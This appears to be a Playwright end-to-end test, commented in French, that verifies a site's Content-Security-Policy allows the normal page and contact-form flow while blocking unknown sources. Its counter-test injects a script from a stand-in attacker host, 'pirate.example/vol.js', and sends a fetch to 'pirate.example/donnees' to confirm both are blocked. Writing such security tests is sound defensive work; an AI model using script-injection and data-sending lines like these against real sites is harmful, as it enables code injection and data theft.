// e2e/security.spec.ts
// Vérifie que la politique de sécurité (CSP) de public/_headers ne bloque rien
// d'utile, et qu'elle bloque bien ce qui n'est pas autorisé.
// "npm run preview" ne lit pas _headers (seul Cloudflare le fait) : le test
// ajoute donc lui-même l'en-tête, LU DANS LE VRAI FICHIER, à chaque page.

import { readFileSync } from "node:fs";
import { expect, test } from "@playwright/test";
import { fakeEmailJs, fakeGoogleMaps, fakeRecaptcha } from "./fakes";

function readCspFromHeadersFile(): string {
  const line = readFileSync("public/_headers", "utf8")
    .split("\n")
    .find((l) => l.trim().startsWith("Content-Security-Policy:"));
  if (!line) throw new Error("Aucune CSP trouvée dans public/_headers");
  return (
    line
      .split("Content-Security-Policy:")[1]
      .trim()
      // En local, le site est en http : cette règle forcerait https://localhost.
      .replace("; upgrade-insecure-requests", "")
  );
}

test("la CSP laisse fonctionner le site et bloque les sources inconnues", async ({
  page,
  baseURL,
}) => {
  const csp = readCspFromHeadersFile();
  // Ajoute l'en-tête CSP aux pages HTML, comme le fera Cloudflare.
  await page.route(`${baseURL}/**`, async (route) => {
    const response = await route.fetch();
    const headers = response.headers();
    if (headers["content-type"]?.includes("text/html")) {
      headers["content-security-policy"] = csp;
    }
    await route.fulfill({ response, headers });
  });
  await fakeRecaptcha(page);
  await fakeGoogleMaps(page);
  await fakeEmailJs(page);

  // Enregistre chaque blocage signalé par le navigateur.
  const violations: string[] = [];
  await page.exposeFunction("reportViolation", (v: string) => violations.push(v));
  await page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (event) => {
      // @ts-expect-error : fonction ajoutée par exposeFunction ci-dessus
      window.reportViolation(`${event.violatedDirective} ← ${event.blockedURI}`);
    });
  });

  // Parcours normal : aucune violation attendue.
  for (const path of ["/fr", "/en/about", "/fr/services", "/fr/contact"]) {
    await page.goto(path);
  }
  await page.getByRole("button", { name: "Afficher la carte" }).click();
  await page.getByLabel("Nom", { exact: true }).fill("Jean Atangana");
  await page.getByLabel("Email", { exact: true }).fill("jean@exemple.cm");
  await page.getByLabel("Message", { exact: true }).fill("Message de test de la CSP.");
  await page.getByTestId("fake-captcha").click();
  await page.getByRole("button", { name: "Envoyer le message" }).click();
  await expect(page.getByText("Merci ! Votre message a bien été envoyé.")).toBeVisible();
  expect(violations).toEqual([]);

  // Contre-test : un script et un envoi vers un site inconnu doivent être bloqués.
  await page.evaluate(() => {
    const script = document.createElement("script");
    script.src = "https://pirate.example/vol.js";
    document.body.appendChild(script);
    void fetch("https://pirate.example/donnees").catch(() => {});
  });
  await expect.poll(() => violations.length).toBe(2);
});
